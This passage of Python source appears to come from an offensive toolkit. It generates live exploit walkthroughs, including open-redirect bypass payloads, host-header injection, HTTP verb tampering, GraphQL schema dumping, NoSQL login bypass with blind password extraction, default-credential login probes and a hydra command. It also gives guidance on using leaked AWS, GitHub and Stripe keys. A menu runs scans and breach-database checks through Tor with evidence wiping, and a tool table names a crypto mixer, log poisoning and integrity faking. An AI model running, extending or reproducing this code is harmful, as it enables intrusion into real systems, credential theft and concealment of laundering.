             if _target_host else "[ATTACKER]/r"),
            ("Target-as-subdomain",
             "[SCHEME]://evilsub.[ATTACKER_HOST]/r"),
            # Relative resolution inside scheme-less
            ("Data URI",
             "data:text/html,<script>location='[ATTACKER]'</script>"),
            ("Javascript URI (reflective XSS upgrade)",
             "javascript://[ATTACKER_HOST]/%0aalert(1)"),
        ]
        # [SCHEME] placeholder — default to https when substituting.
        redirect_payloads = [
            (name, p.replace("[SCHEME]", "https"))
            for name, p in redirect_payloads
        ]
        # allow_redirects=False is CRITICAL for every step in this branch:
        # the validator reads Location from r.response_headers. When we
        # let requests follow the redirect, r.response_headers is the
        # headers of the redirect TARGET (usually 200, no Location) and
        # every check silently returns 'no redirect' — the walkthrough
        # ends up looking like the bypass didn't work even on a
        # vulnerable target.
        steps = [
            {"title": "Confirm original redirect",
             "request": _get(target, allow_redirects=False),
             "validate": _redir_check,
             "note": "Check Location header baseline"},
        ]
        for name, payload in redirect_payloads:
            steps.append({
                "title": f"Redirect bypass: {name}",
                "request": _get_param(payload, allow_redirects=False),
                "validate": _redir_check,
                "note": f"Testing {name} bypass → attacker host",
            })

    elif etype == "host_header_injection":
        # Host header injection — reflect attacker-controlled Host into
        # Location or into rendered absolute URLs. allow_redirects=False
        # so we read the Location directly.
        _hh_marker = f"hh{secrets.token_hex(4)}.example.test"
        _hh_target_host = (base_url.split("//", 1)[1].split("/", 1)[0]
                           if "//" in base_url else "")

        def _hh_check(r: ExploitResult):
            loc = (r.response_headers.get("Location", "") or
                   r.response_headers.get("location", ""))
            if loc:
                loc_host = urlparse(loc).netloc.lower()
                if loc_host == _hh_marker.lower():
                    r.success = True
                    r.confidence = 0.95
                    r.evidence = f"Location reflected marker host: {loc[:100]}"
                    r.false_positive_risk = "very_low"
                    return
            body = r.response_body or ""
            if _hh_marker in body:
                if (f"//{_hh_marker}" in body or
                        f"://{_hh_marker}" in body or
                        _re.search(
                            r"""(?:href|src|action)\s*=\s*['"][^'"]*"""
                            + _re.escape(_hh_marker)
                            + r"""[^'"]*['"]""", body, _re.I)):
                    r.success = True
                    r.confidence = 0.85
                    r.evidence = "Marker rendered as absolute URL in body"
                    r.false_positive_risk = "low"
                    return
                r.confidence = 0.4
                r.evidence = "Marker appeared in body but not URL-ish"
            elif r.status_code:
                r.evidence = f"HTTP {r.status_code}, no reflection"
                r.confidence = 0.1

        def _hh_request(header_name: str) -> dict:
            return _get(target, extra_headers={header_name: _hh_marker},
                        allow_redirects=False)

        steps = [
            {"title": "Baseline (no injection)",
             "request": _get(target, allow_redirects=False),
             "validate": lambda r: setattr(
                 r, 'evidence',
                 f"Baseline HTTP {r.status_code}, "
                 f"Location: {r.response_headers.get('Location', '-')[:80]}"),
             "note": "Capture server's normal Location so comparisons mean something"},
            {"title": "Host header reflection",
             "request": _hh_request("Host"),
             "validate": _hh_check,
             "warning": "Some WAFs / load balancers reject unexpected Host",
             "note": "Most password-reset link injection flows key off Host"},
            {"title": "X-Forwarded-Host reflection",
             "request": _hh_request("X-Forwarded-Host"),
             "validate": _hh_check,
             "note": "Framework reads X-Forwarded-Host when behind a proxy"},
            {"title": "X-Forwarded-Server reflection",
             "request": _hh_request("X-Forwarded-Server"),
             "validate": _hh_check,
             "note": "Apache/nginx sometimes honor this"},
            {"title": "X-Host reflection",
             "request": _hh_request("X-Host"),
             "validate": _hh_check,
             "note": "Nonstandard but used by some middlewares"},
            {"title": "Double-Host (duplicate header) trick",
             "request": _get(
                 target,
                 extra_headers={"Host": f"{_hh_target_host}",
                                "X-Forwarded-Host": _hh_marker},
                 allow_redirects=False,
             ),
             "validate": _hh_check,
             "note": "Legit Host + malicious X-Forwarded-Host often bypasses "
                     "validators that only check Host"},
            {"title": "Manual: test against the real reset flow",
             "note": ("Many password-reset handlers build the reset "
                      "email's link from the Host: header. Once you've "
                      "confirmed above that Host reflects, exercise "
                      "the REAL reset form manually — don't let the "
                      "scanner fire it. Use a throwaway email with "
                      "your chosen Host: header and watch the email "
                      "for a link pointing at the marker host."),
             "request": None},
        ]

    elif etype == "http_verb_tampering":
        # Verb-tampering: retry the walled path with alternate verbs +
        # method-override header. The finding already told us which
        # path is walled, so we can go straight at it.
        _vt_path = ei.get("path", "/admin")
        _vt_url = base_url.rstrip("/") + _vt_path

        def _vt_check(r: ExploitResult):
            if not r.error and 200 <= r.status_code < 300:
                r.success = True
                r.confidence = 0.9
                r.evidence = f"HTTP {r.status_code} on alt verb → bypass"
                r.false_positive_risk = "low"
            elif r.status_code in (401, 403):
                r.evidence = f"HTTP {r.status_code} — still walled"
                r.confidence = 0.1
            elif r.status_code == 405:
                r.evidence = "405 Method Not Allowed (auth rule fine)"
                r.confidence = 0.05
            elif r.status_code:
                r.evidence = f"HTTP {r.status_code}"

        steps = [
            {"title": f"Baseline GET {_vt_path} (should be 401/403)",
             "request": _get(_vt_url, allow_redirects=False),
             "validate": _vt_check,
             "note": "Confirms the wall is still in place"},
        ]
        for verb in ("HEAD", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"):
            steps.append({
                "title": f"Verb tamper: {verb} {_vt_path}",
                "request": {"method": verb, "url": _vt_url,
                            "allow_redirects": False},
                "validate": _vt_check,
                "note": f"{verb} slips past GET-only auth rule in some WAFs",
            })
        steps.extend([
            {"title": "X-HTTP-Method-Override: GET",
             "request": _get(_vt_url,
                             extra_headers={"X-HTTP-Method-Override": "GET"},
                             allow_redirects=False),
             "validate": _vt_check,
             "note": "Override header read after WAF rule fires"},
            {"title": "X-HTTP-Method: GET",
             "request": _get(_vt_url,
                             extra_headers={"X-HTTP-Method": "GET"},
                             allow_redirects=False),
             "validate": _vt_check,
             "note": "Same as above — alternate header name"},
            {"title": "X-Method-Override: GET",
             "request": _get(_vt_url,
                             extra_headers={"X-Method-Override": "GET"},
                             allow_redirects=False),
             "validate": _vt_check,
             "note": "Another common override header"},
        ])

    elif etype in ("graphql_introspection", "graphql_data_exposure"):
        # GraphQL walkthrough: run introspection, then auto-derive
        # queries for sensitive-looking types. The validator parses
        # the JSON response and flags when __schema or any sensitive
        # fields are returned.
        _gql_path = ei.get("path", "/graphql")
        _gql_url = base_url.rstrip("/") + _gql_path

        def _gql_check(r: ExploitResult):
            body = r.response_body or ""
            try:
                data = json.loads(body[:200000])
            except Exception:
                data = None
            if isinstance(data, dict) and data.get("data"):
                d = data["data"]
                if isinstance(d, dict) and d.get("__schema"):
                    types = d["__schema"].get("types", [])
                    r.success = True
                    r.confidence = 0.95
                    r.evidence = (f"Introspection returned "
                                  f"{len(types)} types")
                    r.false_positive_risk = "very_low"
                    return
                # Other queries — any non-null data field is informative.
                if any(v is not None for v in d.values() if isinstance(d, dict)):
                    r.success = True
                    r.confidence = 0.85
                    r.evidence = "Query returned data"
                    r.false_positive_risk = "low"
                    return
            if isinstance(data, dict) and data.get("errors"):
                errs = data.get("errors", [])
                msgs = [e.get("message", "") for e in errs[:3] if isinstance(e, dict)]
                r.evidence = f"GraphQL errors: {' | '.join(msgs)[:120]}"
                r.confidence = 0.2
                return
            if r.status_code and r.status_code >= 400:
                r.evidence = f"HTTP {r.status_code}"
                r.confidence = 0.1

        _introspect_q = (
            '{"query":"{ __schema { types { name fields '
            '{ name type { name kind } } } } }"}'
        )
        _short_introspect = (
            '{"query":"{ __schema { queryType { name } '
            'mutationType { name } } }"}'
        )
        _common_queries = [
            ('{"query":"{ users { id email username } }"}',
             "enumerate users (common type names)"),
            ('{"query":"{ me { id email role } }"}',
             "current-user context"),
            ('{"query":"{ products { id price } }"}',
             "product listing"),
            ('{"query":"{ orders { id userId total } }"}',
             "order history"),
        ]

        steps = [
            {"title": "Confirm GraphQL endpoint",
             "request": _post(_gql_url, None,
                              extra_headers={"Content-Type": "application/json"}),
             "validate": _gql_check,
             "note": ("Empty POST — server should reply with "
                      "'Must provide query' JSON")},
            {"title": "Short introspection (queryType / mutationType)",
             "request": {"method": "POST", "url": _gql_url,
                         "data": _short_introspect,
                         "headers": {"Content-Type": "application/json"},
                         "allow_redirects": True},
             "validate": _gql_check,
             "note": "If this works, full introspection is open"},
            {"title": "Full introspection (dump whole schema)",
             "request": {"method": "POST", "url": _gql_url,
                         "data": _introspect_q,
                         "headers": {"Content-Type": "application/json"},
                         "allow_redirects": True},
             "validate": _gql_check,
             "warning": "Large response — full API surface area revealed",
             "note": "Attack-surface map for every downstream step"},
        ]
        for q, desc in _common_queries:
            steps.append({
                "title": f"Test query: {desc}",
                "request": {"method": "POST", "url": _gql_url,
                            "data": q,
                            "headers": {"Content-Type": "application/json"},
                            "allow_redirects": True},
                "validate": _gql_check,
                "note": f"Many schemas expose these names",
                "warning": "May dump sensitive data if unauthenticated",
            })

    elif etype == "sourcemap_exposure":
        # Walkthrough for exposed source maps. Fetch the .map file and
        # print the sources[] array so the operator sees exactly which
        # modules got leaked.
        _sm_url = target
        def _sm_check(r: ExploitResult):
            body = r.response_body or ""
            try:
                data = json.loads(body[:500000])
            except Exception:
                data = None
            if isinstance(data, dict) and data.get("sources"):
                src_paths = data["sources"]
                if isinstance(src_paths, list) and src_paths:
                    r.success = True
                    r.confidence = 0.99
                    r.evidence = (f"Source map exposes {len(src_paths)} "
                                  f"source file(s). Sample: "
                                  f"{src_paths[0][:80]}")
                    r.false_positive_risk = "very_low"
                    return
            r.evidence = "Not a valid source map or sources missing"
            r.confidence = 0.2

        steps = [
            {"title": "Fetch source map",
             "request": _get(_sm_url),
             "validate": _sm_check,
             "note": "JSON with 'sources' and 'sourcesContent' arrays"},
            {"title": "Parse sources[] — original source paths",
             "note": ("Each entry in sources[] is an original file "
                      "path. If sourcesContent[] is populated, the "
                      "actual source code is in there base64/inlined."),
             "request": None},
        ]

    elif etype == "js_secret_leak":
        # Walkthrough for secrets discovered in same-origin JS bundles.
        # Report-only — we don't fire live requests against the
        # provider APIs (that would leak Tor-origin probes to
        # third-party APIs we have no control over).
        _secret_kind = ei.get("secret_kind", "unknown")
        _provider_notes = {
            "aws_key": ("Pair with the AWS secret from the same "
                        "bundle (grep for 'AKIA' nearby). Test "
                        "with `aws sts get-caller-identity` on a "
                        "separate box — NEVER from this session."),
            "github_token": ("Test scopes with `gh auth status` / "
                             "`curl -H 'Authorization: token <tok>' "
                             "https://api.github.com/user`. Stored "
                             "GitHub tokens can repo/delete."),
            "stripe_key": ("sk_live_ keys are DANGEROUS — they can "
                           "charge cards and issue refunds. Test "
                           "with the Stripe CLI in test mode only, "
                           "or report to the target immediately."),
            "jwt_token": ("Decode with jwt.io (or jwt-cli). Look at "
                          "the 'exp' claim — if it's in the future, "
                          "replay the token against authenticated "
                          "endpoints."),
        }
        note = _provider_notes.get(
            _secret_kind,
            "Map the secret's format to a provider, test cautiously "
            "from a separate host.")
        steps = [
            {"title": f"Secret type: {_secret_kind}",
             "note": f"Evidence: {ei.get('method', note)[:200]}",
             "request": None},
            {"title": "Verification playbook",
             "note": note,
             "request": None},
        ]

    elif etype == "brute_force_viable":
        # Brute-force walkthrough — generate a reference hydra cmd and a
        # small credential-stuffing probe using the most common passwords.
        # We do NOT actually run a wordlist — responsibility for a real
        # brute-force stays with the operator.
        _bf_url = target
        _bf_path = ei.get("path", "/")
        _bf_user_field = ei.get("username_field", "username")
        _bf_pass_field = ei.get("password_field", "password")

        _small_creds = [
            ("admin", "admin"), ("admin", "password"),
            ("admin", "admin123"), ("admin", "letmein"),
            ("root", "root"), ("root", "toor"),
            ("test", "test"), ("user", "user"),
        ]

        def _bf_check(r: ExploitResult):
            # A successful login typically redirects (3xx to a dashboard
            # path) or sets a session cookie. Flag any 2xx that's not
            # the login page itself, or any 3xx Location that looks like
            # a post-login page.
            sc = r.status_code
            loc = (r.response_headers.get("Location", "") or
                   r.response_headers.get("location", ""))
            if sc in (301, 302, 303, 307, 308) and loc:
                low_loc = loc.lower()
                if any(h in low_loc for h in
                       ("dashboard", "account", "profile", "home",
                        "welcome", "admin/index")):
                    r.success = True
                    r.confidence = 0.9
                    r.evidence = f"Login succeeded — redirect to {loc[:80]}"
                    r.false_positive_risk = "low"
                    return
            if sc == 200 and "Set-Cookie" in r.response_headers:
                r.evidence = (f"200 with Set-Cookie — possibly successful; "
                              f"verify manually")
                r.confidence = 0.5
                return
            r.evidence = f"HTTP {sc}, no post-login redirect"
            r.confidence = 0.05

        steps = [{"title": "Reference: hydra command",
                  "note": (f"hydra -L users.txt -P passwords.txt "
                           f"-s <PORT> -f -m '/'{_bf_path}':"
                           f"{_bf_user_field}=^USER^&"
                           f"{_bf_pass_field}=^PASS^:F=<failure_string>' "
                           f"{urlparse(_bf_url).netloc} http-post-form")}]
        for u, p in _small_creds:
            steps.append({
                "title": f"Probe: {u}:{p}",
                "request": _post(_bf_url,
                                 {_bf_user_field: u, _bf_pass_field: p},
                                 extra_headers=None),
                "validate": _bf_check,
                "note": f"Common default credential pair",
            })
        # Also override: ensure allow_redirects=False for every step
        # so we can see the raw response and Location header.
        for s in steps[1:]:
            if "request" in s:
                s["request"]["allow_redirects"] = False

    elif etype == "user_enumeration":
        # User enumeration: probe a small list of common usernames and
        # compare response sizes to the bogus-username baseline.
        _ue_url = target
        _ue_path = ei.get("path", "/")

        _common_users = [
            "admin", "administrator", "root", "test", "user", "demo",
            "guest", "support", "help", "info",
        ]

        _bogus_user = f"gs_{secrets.token_hex(4)}"
        _bogus_len_holder: List[int] = []

        def _ue_baseline(r: ExploitResult):
            _bogus_len_holder.append(len(r.response_body or ""))
            r.evidence = (f"Baseline (wrong-user) length: "
                          f"{_bogus_len_holder[-1]}")

        def _ue_probe(r: ExploitResult):
            if not _bogus_len_holder:
                r.evidence = "Baseline not captured"
                return
            base_len = _bogus_len_holder[0]
            cur_len = len(r.response_body or "")
            delta = abs(cur_len - base_len)
            if base_len > 0 and delta > base_len * 0.2:
                r.success = True
                r.confidence = 0.85
                r.evidence = (f"Length diff: {cur_len} vs baseline "
                              f"{base_len} (delta={delta}) — username "
                              f"likely exists")
                r.false_positive_risk = "low"
            else:
                r.evidence = (f"Length similar to baseline "
                              f"({cur_len} vs {base_len}) — username "
                              f"probably doesn't exist")
                r.confidence = 0.2

        steps = [
            {"title": "Baseline (bogus username)",
             "request": _post(_ue_url,
                              {"username": _bogus_user,
                               "password": secrets.token_hex(4)}),
             "validate": _ue_baseline,
             "note": "Capture response length for bogus user"},
        ]
        for u in _common_users:
            steps.append({
                "title": f"Probe: {u}",
                "request": _post(_ue_url,
                                 {"username": u,
                                  "password": secrets.token_hex(4)}),
                "validate": _ue_probe,
                "note": f"If response length differs, '{u}' exists",
            })

    elif etype == "nosql_injection":
        # NoSQL walkthrough — try [$ne], [$gt], [$regex], and the
        # JSON-body shape that MongoDB drivers accept.
        _nq_param = param or "id"
        _nq_base = target.split("?")[0]

        def _nq_check(r: ExploitResult):
            body = r.response_body or ""
            for ind in (
                _re.compile(r"MongoError|MongoServerError", _re.I),
                _re.compile(r"E11000 duplicate key", _re.I),
                _re.compile(r"CastError:.*ObjectId", _re.I),
                _re.compile(r"\$where.*not allowed", _re.I),
                _re.compile(r"unknown top level operator", _re.I),
            ):
                if ind.search(body[:6000]):
                    r.success = True
                    r.confidence = 0.9
                    r.evidence = f"NoSQL error: {ind.pattern[:40]}"
                    r.false_positive_risk = "low"
                    return
            if r.status_code == 200 and len(body) > 200:
                r.confidence = 0.5
                r.evidence = (f"HTTP 200 with {len(body)}-byte body — "
                              f"check response manually for enumerated data")
                r.false_positive_risk = "medium"

        steps = [
            {"title": "Baseline (bogus scalar)",
             "request": _get(_nq_base,
                             extra_params={_nq_param: f"xx{secrets.token_hex(3)}"}),
             "validate": _nq_check,
             "note": "Capture baseline length / status for boolean compare"},
            {"title": "$ne operator (always-true)",
             "request": _get(_nq_base,
                             extra_params={f"{_nq_param}[$ne]": "0"}),
             "validate": _nq_check,
             "note": "Coerces every document to match. More data in "
                     "response = confirmed."},
            {"title": "$gt operator (always-true)",
             "request": _get(_nq_base,
                             extra_params={f"{_nq_param}[$gt]": ""}),
             "validate": _nq_check,
             "note": "Same idea as $ne"},
            {"title": "$regex operator (pattern matching)",
             "request": _get(_nq_base,
                             extra_params={f"{_nq_param}[$regex]": ".*"}),
             "validate": _nq_check,
             "note": "Data extraction primitive — returns any document"},
            {"title": "$where JS injection",
             "request": _get(_nq_base,
                             extra_params={f"{_nq_param}[$where]": "1==1"}),
             "validate": _nq_check,
             "warning": "MongoDB $where runs JavaScript — full RCE class",
             "risk": "HIGH"},
            {"title": "JSON body auth-bypass shape",
             "request": _post(
                 _nq_base,
                 {"username": "admin", "password": '{"$ne": null}'},
             ),
             "validate": _nq_check,
             "warning": "Common MongoDB login bypass — no password check",
             "note": "{'$ne': null} matches any document"},
            {"title": "Blind boolean: password $regex",
             "request": _post(
                 _nq_base,
                 {"username": "admin",
                  "password": '{"$regex": "^a"}'},
             ),
             "validate": _nq_check,
             "note": "Extracts the password one character at a time "
                     "by iterating ^a, ^b, ^aa, ^ab, ..."},
        ]

    else:
        steps = [
            {"title": f"Manual verification for {etype}",
             "note": f"Evidence: {ei.get('method', 'See report for details')[:100]}"},
        ]

    return steps


def _extract_base_url_from_vulns(vulns: list) -> str:
    """Extract the base URL from vulnerability findings."""
    for v in vulns:
        ev = v.get("evidence", "")
        if "http" in ev:
            import re as _re
            m = _re.search(r"https?://[^\s,)]+", ev)
            if m:
                parsed = urlparse(m.group(0))
                return f"{parsed.scheme}://{parsed.netloc}"
    return ""


def flow_intel(detected_port=None):
    heading("Intelligence Gathering & Vulnerability Scanner")
    print(f"  This tool performs OSINT collection and vulnerability scanning")
    print(f"  through Tor. All data is stored in RAM (/dev/shm).")
    _pr = check_prereqs()
    if not _pr.get("shm_writable"):
        _why = _pr.get("shm_reason") or "unknown"
        print(f"  {R}WARNING: /dev/shm is NOT usable ({_why}) — intel data "
              f"WILL be stored on disk in ROOT/.intel_tmp.{N}")
        print(f"  {R}Use a system with a writable tmpfs/ramfs mount for "
              f"OPSEC-safe operation.{N}")
    elif not _pr.get("shm_is_tmpfs"):
        print(f"  {Y}Note: /dev/shm exists and is writable but does NOT "
              f"appear to be a tmpfs/ramfs mount. Files may persist on "
              f"physical media.{N}")
    print()
    print(f"  {B}Modes:{N}")
    print(f"    {G}1{N}  Domain Recon + Vuln Scan    (enter a domain)")
    print(f"    {G}2{N}  Email Breach Check           (check breach databases)")
    print(f"    {G}3{N}  Search Query OSINT           (search + scrape)")
    print(f"    {G}4{N}  Batch Targets from File      (one target per line)")
    print(f"    {G}5{N}  Exploit Walkthrough          (interactive + presets)")
    print(f"    {G}5a{N} Smart Exploit                (pre-gen files + serve + chain output)")
    print(f"    {G}6{N}  View Reports                 (read saved scan results)")
    print(f"    {G}7{N}  Wipe Intel Data              (secure erase from RAM)")
    print(f"    {G}8{N}  Manage Exploit Files         (view/wipe ephemeral files)")
    print()
    mode = prompt("Choose mode (1-8, 5a)")

    if mode == "8":
        heading("Exploit File Management")
        fm = ExploitFileManager(ttl_seconds=300)
        files = fm.list_files()
        ram_dir = fm.base_dir
        all_exploit_files = list(ram_dir.glob("*.html")) + list(ram_dir.glob("*.txt")) + list(ram_dir.glob("*.json"))
        exploit_files = [f for f in all_exploit_files if not f.name.startswith("intel_")]

        if not exploit_files:
            info("No exploit files found in ephemeral storage.")
            return

        print(f"  {B}Ephemeral Exploit Files:{N}")
        print(f"  {'─' * 55}")
        for idx, f in enumerate(exploit_files, 1):
            size_kb = f.stat().st_size / 1024
            age_min = (_time_mod.time() - f.stat().st_mtime) / 60
            age_str = f"{age_min:.0f}m ago" if age_min < 60 else f"{age_min/60:.1f}h ago"
            print(f"    {idx:>2}  {f.name:35s}  {size_kb:.1f}KB  {age_str}")
        print()
        print(f"  {B}Actions:{N}")
        print(f"    {G}1{N}  View a file")
        print(f"    {G}2{N}  Wipe all exploit files")
        print(f"    {G}3{N}  Wipe by type (clickjack/csrf/cors/xss/...)")
        print()
        action = prompt("Choose action (1-3, or Enter to go back)")
        if action == "1":
            idx_str = prompt("File number (from list above)")
            if idx_str.isdigit():
                idx = int(idx_str) - 1
                if 0 <= idx < len(exploit_files):
                    content = exploit_files[idx].read_text()
                    print()
                    for line in content.split("\n")[:50]:
                        print(f"    {line}")
                    if content.count("\n") > 50:
                        info(f"... ({content.count(chr(10)) - 50} more lines)")
        elif action == "2":
            if confirm(f"Securely wipe {len(exploit_files)} exploit file(s)?"):
                for f in exploit_files:
                    try:
                        size = f.stat().st_size
                        with open(f, "wb") as fh:
                            fh.write(os.urandom(max(size, 64)))
                            fh.flush()
                            os.fsync(fh.fileno())
                        f.unlink()
                    except OSError:
                        pass
                ok(f"Wiped {len(exploit_files)} exploit file(s)")
        elif action == "3":
            etype = prompt("Exploit type prefix (e.g. clickjack, csrf, cors, xss, sqli, lfi, cmdi)")
            matched = [f for f in exploit_files if f.name.startswith(etype)]
            if not matched:
                info(f"No files matching '{etype}*'")
            elif confirm(f"Wipe {len(matched)} file(s) matching '{etype}*'?"):
                for f in matched:
                    try:
                        size = f.stat().st_size
                        with open(f, "wb") as fh:
                            fh.write(os.urandom(max(size, 64)))
                            fh.flush()
                            os.fsync(fh.fileno())
                        f.unlink()
                    except OSError:
                        pass
                ok(f"Wiped {len(matched)} file(s)")
        return

    if mode == "7":
        ram_dir = Path("/dev/shm/intel") if Path("/dev/shm/intel").exists() else ROOT / ".intel_tmp"
        if not ram_dir.exists():
            info("No intel data to wipe.")
            return
        files = list(ram_dir.glob("*"))
        if not files:
            info("Intel directory is empty.")
            return
        total_kb = sum(f.stat().st_size for f in files if f.is_file()) / 1024
        warn(f"Will securely erase {len(files)} file(s) ({total_kb:.1f}KB) from {ram_dir.name}/")
        for f in files[:10]:
            print(f"    {D}{f.name}{N}")
        if len(files) > 10:
            print(f"    {D}... and {len(files) - 10} more{N}")
        print()
        if confirm("Proceed with secure wipe? (files overwritten with random data)"):
            run_script(INTEL / "testergatherSystem", ["--wipe"], "Intel wipe")
            ok("Intel data wiped.")
        else:
            info("Wipe cancelled.")
        return

    if mode == "6":
        # Interactive report browser — list, select by number, view inline
        ram_dir = Path("/dev/shm/intel") if Path("/dev/shm/intel").exists() else ROOT / ".intel_tmp"
        if not ram_dir.exists() or not any(ram_dir.glob("intel_*")):
            info("No reports found. Run a scan first (mode 1).")
            return
        reports = sorted(ram_dir.glob("intel_*"), key=lambda f: f.stat().st_mtime, reverse=True)
        if not reports:
            info("No reports found.")
            return
        heading("Saved Reports")
        import time as _t
        for idx, rp in enumerate(reports):
            age_min = (_t.time() - rp.stat().st_mtime) / 60
            size_kb = rp.stat().st_size / 1024
            enc_icon = "encrypted" if rp.suffix == ".enc" else "plain"
            if age_min < 60:
                age_str = f"{age_min:.0f}m ago"
            elif age_min < 1440:
                age_str = f"{age_min/60:.1f}h ago"
            else:
                age_str = f"{age_min/1440:.0f}d ago"
            print(f"    {G}{idx+1}{N}  {rp.name}  ({size_kb:.1f}KB, {age_str}, {enc_icon})")
        print()
        choice_str = prompt("Enter number to view (or Enter to skip)")
        if choice_str and choice_str.isdigit():
            idx = int(choice_str) - 1
            if 0 <= idx < len(reports):
                run_script(INTEL / "testergatherSystem", ["--read-report", str(reports[idx])], "View report")
            else:
                err(f"Invalid choice: {choice_str}")
        return

    if mode in ("5", "5a"):
        tor = get_tor_proxy(detected_port)
        if not tor:
            return
        _intel_exploit_walkthrough(tor, auto_mode=(mode == "5a"))
        return

    tor = get_tor_proxy(detected_port)
    if not tor:
        return

    if mode == "1":
        domain = prompt("Target domain (e.g. example.com)")
        if not domain:
            err("Domain is required.")
            return
        # Clean domain input
        domain = domain.strip().lower()
        if domain.startswith("http://") or domain.startswith("https://"):
            from urllib.parse import urlparse as _up
            domain = _up(domain).netloc or domain
        if "/" in domain:
            domain = domain.split("/")[0]

        print()
        print(f"  {B}Scan depth:{N}")
        print(f"    {G}quick{N}  — headers + data extraction + tech fingerprint")
        print(f"    {G}full{N}   — + sensitive paths + vuln checks + DNS recon")
        print(f"    {G}deep{N}   — + subdomain enum + exploit detection (SQLi/XSS/traversal)")
        print()
        depth = prompt("Scan depth", "full").lower()
        if depth not in ("quick", "full", "deep"):
            depth = "full"

        args = ["--domain", domain, "--scan", depth, "--tor-proxy", tor]

        # Cookie support for authenticated scanning
        cookie_input = prompt("Session cookies (name=value, comma-separated, or Enter to skip)", "")
        if cookie_input.strip():
            for ck in cookie_input.split(","):
                ck = ck.strip()
                if "=" in ck:
                    args.extend(["--cookie", ck])
        if run_script(INTEL / "testergatherSystem", args, "Intel scan",
                       keep_env=("HIBP_KEY", "DEHASHED_KEY",
                                 "DEHASHED_EMAIL", "COINGECKO_API_KEY")):
            if depth == "deep":
                print()
                print(f"  {B}Post-scan options:{N}")
                print(f"    {G}1{N}  Interactive walkthrough  (step-by-step with presets)")
                print(f"    {G}2{N}  Smart exploit            (pre-gen files + serve + chain)")
                print(f"    {G}3{N}  Skip")
                print()
                post = prompt("Choose", "1")
                if post == "1":
                    _intel_exploit_walkthrough(tor, auto_mode=False)
                elif post == "2":
                    _intel_exploit_walkthrough(tor, auto_mode=True)

    elif mode == "2":
        email = prompt("Email address to check")
        if not email or "@" not in email:
            err("Valid email address required.")
            return
        # Proactive sanity check — the child script silently no-ops
        # when the API keys aren't set, which confuses operators into
        # thinking the breach databases have no records on the email.
        _have_hibp = bool(os.environ.get("HIBP_KEY"))
        _have_dehashed = bool(os.environ.get("DEHASHED_KEY") and
                              os.environ.get("DEHASHED_EMAIL"))
        if not _have_hibp and not _have_dehashed:
            warn("No breach-database API keys configured.")
            info("Set HIBP_KEY (https://haveibeenpwned.com/API/Key) or")
            info("DEHASHED_EMAIL + DEHASHED_KEY (https://dehashed.com/api)")
            info("in your environment before launching, then retry.")
            if not confirm("Continue anyway? (will produce empty results)"):
                return
        elif os.environ.get("DEHASHED_KEY") and not os.environ.get("DEHASHED_EMAIL"):
            warn("DEHASHED_KEY is set but DEHASHED_EMAIL is not — "
                 "DeHashed auth will fail. Set both to use DeHashed.")
        args = ["--email", email, "--tor-proxy", tor]
        # Breach-DB API keys are normally stripped from child env by the
        # default-deny policy. Let them through here or the breach
        # check is a silent no-op.
        run_script(INTEL / "testergatherSystem", args, "Breach check",
                   keep_env=("HIBP_KEY", "DEHASHED_KEY", "DEHASHED_EMAIL"))

    elif mode == "3":
        query = prompt("Search query")
        if not query:
            err("Query is required.")
            return
        max_r = prompt("Max results to scrape", "20")
        args = ["--query", query, "--max-results", max_r, "--tor-proxy", tor]
        run_script(INTEL / "testergatherSystem", args, "OSINT search")

    elif mode == "4":
        filepath = prompt("Path to targets file")
        if not filepath:
            err("File path is required.")
            return
        # run_script() chdirs child into ROOT, so a relative path
        # entered by the operator (resolved against their shell's
        # CWD) would suddenly resolve against ROOT inside the child
        # and silently miss the file. Resolve once, here, so what the
        # user typed is what the child sees.
        filepath_abs = str(Path(filepath).expanduser().resolve())
        if not Path(filepath_abs).exists():
            err(f"File not found: {Path(filepath).name}")
            return
        depth = prompt("Scan depth (quick/full/deep)", "full").lower()
        if depth not in ("quick", "full", "deep"):
            depth = "full"
        args = ["--file", filepath_abs, "--scan", depth, "--tor-proxy", tor]
        cookie_input = prompt("Session cookies (name=value, comma-separated, or Enter to skip)", "")
        if cookie_input.strip():
            for ck in cookie_input.split(","):
                ck = ck.strip()
                if "=" in ck:
                    args.extend(["--cookie", ck])
        # Batch mode can dispatch to breach checks for email targets, so
        # let the API keys through too.
        run_script(INTEL / "testergatherSystem", args, "Batch intel",
                   keep_env=("HIBP_KEY", "DEHASHED_KEY",
                             "DEHASHED_EMAIL", "COINGECKO_API_KEY"))

    else:
        warn(f"Unknown mode: {mode}")


def flow_system_check():
    heading("System Check")
    st = check_prereqs()
    ready = show_status(st)
    print()
    if ready:
        ok("System is ready!")
    else:
        warn("Some components are missing — see above")
        if confirm("Run installer to fix missing deps?"):
            subprocess.run(["bash", str(ROOT / "install.sh")], timeout=600,
                           env=_sanitized_env())
    return st


# ── CLI passthrough ────────────────────────────────────────────────────────

TOOLS = {
    "mixer": CORE/"mixer_core", "gs": CORE/"mixer_core",
    "signer": CORE/"airgap_tx_signer", "broadcast": CORE/"broadcast_signed_xmr",
    "wallet": CORE/"create_receive_wallet", "swap": CORE/"thor_swap_preparer",
    "exit": CORE/"exit_strategy_planner", "exitplan": CORE/"exit_strategy_planner",
    "dag": MODS/"PAG", "labels": MODS/"labelmask", "poison": MODS/"label_poisoner",
    "leaves": MODS/"fake_leaf_inserter", "noise": MODS/"noise",
    "mutate": MODS/"ghostmutator", "wdna": MODS/"wdna", "seed": MODS/"en_seeder",
    "unify": MODS/"ghost_unifier", "retry": MODS/"swap_retry_guard",
    "juggler": MODS/"tor_endpoint_juggler", "timing": MODS/"vm_runtime",
    "paranoia": OPSEC/"paranoia_mode", "logpoison": OPSEC/"error_log_poisoner",
    "mirror": OPSEC/"mirrormask", "deadman": OPSEC/"dmswitch",
    "memseed": OPSEC/"SML", "intfake": OPSEC/"integrity_faker", "verify": OPSEC/"entropy_verifier",
    "collect": INTEL/"collectgrab", "gather": INTEL/"testergatherSystem",
    "intel": INTEL/"testergatherSystem", "vulnscan": INTEL/"testergatherSystem",
}


def cli_passthrough():
    """Direct CLI mode: python3 run <tool> [args...]"""
    tool_name = sys.argv[1].lower()
    if tool_name not in TOOLS:
        print(f"  {R}[!]{N} Unknown tool: {tool_name}")
        print(f"  Available: {', '.join(sorted(set(TOOLS.keys())))}")
        sys.exit(1)
    tool_path = TOOLS[tool_name]
    if not tool_path.exists():
        print(f"  {R}[!]{N} Tool not found: {tool_name}")
        sys.exit(1)
    _exec_env = _sanitized_env()
    os.environ.clear()
    os.environ.update(_exec_env)
    os.execvp(sys.executable, [sys.executable, str(tool_path)] + sys.argv[2:])


